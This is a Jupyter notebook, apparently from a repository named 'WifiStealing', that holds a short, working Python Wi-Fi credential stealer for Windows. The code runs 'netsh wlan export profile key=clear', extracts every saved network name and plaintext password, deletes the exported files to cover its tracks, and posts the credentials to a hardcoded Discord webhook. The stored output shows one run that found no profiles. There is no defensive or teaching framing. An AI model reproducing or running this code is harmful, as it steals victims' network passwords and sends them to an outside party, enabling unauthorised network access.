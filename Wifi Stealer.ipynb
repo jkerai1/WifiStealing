{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "6e7309b6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "No Wi-Fi profiles found.  Exiting application\n"
     ]
    },
    {
     "ename": "SystemExit",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "An exception has occurred, use %tb to see the full traceback.\n",
      "\u001b[1;31mSystemExit\u001b[0m\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\JayK\\anaconda3\\lib\\site-packages\\IPython\\core\\interactiveshell.py:3406: UserWarning: To exit: use 'exit', 'quit', or Ctrl-D.\n",
      "  warn(\"To exit: use 'exit', 'quit', or Ctrl-D.\", stacklevel=1)\n"
     ]
    }
   ],
   "source": [
    "import subprocess, os, sys, requests\n",
    "import xml.etree.ElementTree as ET\n",
    "\n",
    "url = 'https://discord.com/api/webhooks/1005181355619004517/7yrFrCV65AxWeliU880pye3EyB15ccU4Yp1Va5Ny-BXQa8y9YYG2joKzmCWW5211RGly'\n",
    "wifi_files = []\n",
    "payload = {\"SSID\":[], \"Password\":[]}\n",
    "\n",
    "\n",
    "command_output = subprocess.run([\"netsh\", \"wlan\", \"export\", \"profile\", \"key=clear\"], capture_output = True).stdout.decode()\n",
    "\n",
    "path = os.getcwd()\n",
    "\n",
    "for filename in os.listdir(path):\n",
    "    if filename.startswith(\"Wi-Fi\") and filename.endswith(\".xml\"):\n",
    "        wifi_files.append(filename)\n",
    "\n",
    "if len(wifi_files) >= 1:\n",
    "    for file in wifi_files:\n",
    "        tree = ET.parse(file)\n",
    "        root = tree.getroot()\n",
    "        SSID = root[0].text\n",
    "        password = root[4][0][1][2].text\n",
    "        payload[\"SSID\"].append(SSID)\n",
    "        payload[\"Password\"].append(password)\n",
    "        os.remove(file)\n",
    "    print(\"Wi-Fi profiles found\")\n",
    "else:\n",
    "        print(\"No Wi-Fi profiles found\")\n",
    "        sys.exit()\n",
    "\n",
    "payload_str = \" & \".join(\"%s=%s\" % (k,v) for k,v in payload.items())\n",
    "r = requests.post(url, params='format=json', data=payload_str)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3880aa41",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
